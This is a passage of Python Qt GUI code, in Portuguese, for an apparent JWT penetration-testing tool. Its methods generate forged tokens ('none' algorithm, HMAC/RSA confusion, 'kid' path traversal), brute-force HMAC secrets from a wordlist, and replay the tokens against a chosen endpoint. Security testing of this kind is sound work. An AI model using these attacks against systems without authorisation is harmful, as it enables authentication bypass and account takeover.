        self.saida_analise.setPlainText(
            "Analise um token para ver o resumo e os problemas identificados."
        )
        self.saida_endpoint.setPlainText(
            "O resultado do teste de endpoint será exibido aqui, com status e tamanho de cada resposta."
        )
        self._analise = None
        self._tokens = []
        self.btn_copiar.setEnabled(False)
        self.btn_exportar.setEnabled(False)
        self._log.clear()

    def _publicar_tokens(self, tokens: List[TokenGerado]) -> None:
        """Substitui a tabela de tokens gerados e habilita as ações dependentes."""
        self._tokens = tokens
        preencher_tabela(self.tabela_tokens, [token.para_linha() for token in tokens])
        for indice, token in enumerate(tokens):
            item = self.tabela_tokens.item(indice, 0)
            if item is not None:
                cor = cor_ataque(token.ataque)
                if cor:
                    item.setForeground(QBrush(QColor(cor)))
            item_token = self.tabela_tokens.item(indice, 1)
            if item_token is not None:
                item_token.setToolTip(token.token)
        self.btn_copiar.setEnabled(bool(tokens))
        self.btn_exportar.setEnabled(bool(tokens))

    def _atacar_none(self) -> None:
        """Gera variações do ataque de algoritmo 'none'."""
        if not self._confirmar():
            return
        try:
            tokens = gerar_tokens_alg_none(self._token_atual())
        except ValueError as exc:
            mostrar_erro(self, "Não foi possível gerar as variações", exc)
            return
        self._publicar_tokens(tokens)
        self._log.append_log(
            "SUCESSO", f"{len(tokens)} variação(ões) de algoritmo 'none' geradas."
        )
        self.saida_analise.setPlainText(
            f"{len(tokens)} variação(ões) de algoritmo 'none' geradas. "
            "Teste cada token no endpoint para verificar se o servidor aceita tokens sem assinatura."
        )

    def _atacar_confusao(self) -> None:
        """Gera tokens HS256 assinados com a chave pública RSA informada."""
        if not self._confirmar():
            return
        try:
            token = self._token_atual()
            tokens = gerar_tokens_confusao_hmac_rsa(token, self.txt_chave.toPlainText())
        except ValueError as exc:
            mostrar_erro(self, "Não foi possível gerar as variações", exc)
            return
        self._publicar_tokens(tokens)
        self._log.append_log(
            "SUCESSO", f"{len(tokens)} variação(ões) de confusão HMAC/RSA geradas."
        )
        self.saida_analise.setPlainText(
            f"{len(tokens)} variação(ões) de confusão HMAC/RSA geradas. "
            "O servidor vulnerável valida HS256 usando a chave pública como segredo."
        )

    def _atacar_kid(self) -> None:
        """Gera tokens com valores de kid que tentam travessia de caminho."""
        if not self._confirmar():
            return
        try:
            tokens = gerar_tokens_kid_traversal(self._token_atual())
        except ValueError as exc:
            mostrar_erro(self, "Não foi possível gerar as variações", exc)
            return
        self._publicar_tokens(tokens)
        self._log.append_log(
            "SUCESSO", f"{len(tokens)} variação(ões) de travessia de kid geradas."
        )
        self.saida_analise.setPlainText(
            f"{len(tokens)} variação(ões) de travessia de kid geradas. "
            "Verifique se o servidor resolve a chave a partir do caminho informado."
        )

    def _atacar_forca_bruta(self) -> None:
        """Executa a força bruta HMAC em segundo plano e publica o resultado."""
        if not self._confirmar():
            return
        try:
            token = self._token_atual()
        except ValueError as exc:
            mostrar_erro(self, "Token inválido", exc)
            return

        self.progresso.setRange(0, len(SEGREDOS_COMUNS))
        self.progresso.setValue(0)
        self.btn_forca_bruta.setEnabled(False)
        self._log.append_log("INFO", "Iniciando força bruta HMAC com a wordlist interna.")

        def tarefa(ctx):
            return forcar_segredo_hmac(
                token,
                is_cancelled=ctx.is_cancelled,
                on_progress=ctx.progress,
                on_log=ctx.log,
            )

        def concluiu(resultado: ResultadoForcaBruta) -> None:
            self.btn_forca_bruta.setEnabled(True)
            self.progresso.setValue(self.progresso.maximum())
            self.saida_analise.setPlainText(resultado.resumo())
            if resultado.segredo is not None:
                self._log.append_log(
                    "SUCESSO", f"Segredo HMAC encontrado: {resultado.segredo}"
                )
            else:
                self._log.append_log("INFO", "Segredo não encontrado na wordlist interna.")

        def falhou(erro: Exception) -> None:
            self.btn_forca_bruta.setEnabled(True)
            self._log.append_log("ERRO", f"Falha na força bruta: {erro}")
            mostrar_erro(self, "Falha na força bruta", erro)

        def progrediu(atual: int, total: int, mensagem: str) -> None:
            total = max(1, int(total))
            self.progresso.setMaximum(total)
            self.progresso.setValue(min(int(atual), total))

        def logou(nivel: str, mensagem: str) -> None:
            self._log.append_log(nivel, mensagem)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=concluiu,
            ao_falhar=falhou,
            ao_progredir=progrediu,
            ao_logar=logou,
        )

    def _ao_selecionar_token(self) -> None:
        """Atualiza a prévia colorida ao selecionar um token na tabela."""
        linhas = self.tabela_tokens.selectionModel().selectedRows()
        if not linhas:
            return
        indice = linhas[0].row()
        if 0 <= indice < len(self._tokens):
            self.previa.setHtml(colorir_token_html(self._tokens[indice].token))

    def _copiar_token(self) -> None:
        """Copia o token selecionado para a área de transferência."""
        linhas = self.tabela_tokens.selectionModel().selectedRows()
        if not linhas:
            mostrar_erro(
                self,
                "Nenhum token selecionado",
                "Selecione uma linha da tabela de tokens gerados.",
            )
            return
        indice = linhas[0].row()
        if not (0 <= indice < len(self._tokens)):
            return
        QApplication.clipboard().setText(self._tokens[indice].token)
        self._log.append_log("INFO", "Token copiado para a área de transferência.")

    def _exportar_tokens(self) -> None:
        """Solicita o destino e grava os tokens gerados em JSON."""
        if not self._tokens:
            return
        destino, _ = QFileDialog.getSaveFileName(
            self,
            "Exportar tokens gerados",
            "tokens_jwt.json",
            "Arquivo JSON (*.json);;Todos os arquivos (*.*)",
        )
        if not destino:
            return
        conteudo = json.dumps(
            [asdict(token) for token in self._tokens], ensure_ascii=False, indent=2
        )
        try:
            with open(destino, "w", encoding="utf-8", newline="") as arquivo:
                arquivo.write(conteudo)
        except OSError as exc:
            mostrar_erro(self, "Falha ao salvar", exc)
            return
        self._log.append_log("SUCESSO", f"Tokens exportados para {destino}.")

    def _testar_endpoint(self) -> None:
        """Envia os tokens gerados ao endpoint informado e compara as respostas."""
        if not self._confirmar():
            return
        try:
            token_atual = self._token_atual()
        except ValueError as exc:
            mostrar_erro(self, "Token inválido", exc)
            return
        endpoint = self.txt_endpoint.text().strip()
        if not endpoint:
            mostrar_erro(
                self,
                "Endpoint não informado",
                "Informe a URL do endpoint que receberá os tokens de teste.",
            )
            return

        tokens = [token.token for token in self._tokens] or [token_atual]
        referencia = token_atual if self._tokens else None
        cabecalho = self.txt_cabecalho.text().strip() or "Authorization"

        self.btn_testar.setEnabled(False)
        self.btn_cancelar.setEnabled(True)
        self.saida_endpoint.setPlainText("Testando o endpoint...")
        self._log.append_log(
            "INFO", f"Testando {len(tokens)} token(s) contra {endpoint}."
        )

        def tarefa(ctx):
            return testar_endpoint(
                endpoint,
                tokens,
                cabecalho=cabecalho,
                token_referencia=referencia,
                is_cancelled=ctx.is_cancelled,
                on_log=ctx.log,
            )

        def concluiu(resultados: List[ResultadoEndpoint]) -> None:
            self.btn_testar.setEnabled(True)
            self.btn_cancelar.setEnabled(False)
            linhas = []
            for resultado in resultados:
                linhas.append(
                    f"{resultado.rotulo}: HTTP {resultado.status} | "
                    f"{resultado.tamanho} bytes | {resultado.tempo_ms:.0f} ms | "
                    f"{resultado.observacao}"
                )
            self.saida_endpoint.setPlainText("\n".join(linhas))
            self._log.append_log(
                "INFO", f"Teste de endpoint concluído: {len(resultados)} medição(ões)."
            )

        def falhou(erro: Exception) -> None:
            self.btn_testar.setEnabled(True)
            self.btn_cancelar.setEnabled(False)
            self.saida_endpoint.setPlainText(f"Falha no teste de endpoint: {erro}")
            mostrar_erro(self, "Falha no teste de endpoint", erro)

        def logou(nivel: str, mensagem: str) -> None:
            self._log.append_log(nivel, mensagem)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=concluiu,
            ao_falhar=falhou,
            ao_logar=logou,
        )

    def _cancelar(self) -> None:
        """Solicita o cancelamento do teste de endpoint em andamento."""
        if hasattr(self.runner, "cancel_current"):
            self.runner.cancel_current()
        self.btn_cancelar.setEnabled(False)
        self._log.append_log("AVISO", "Cancelamento solicitado pelo usuário.")
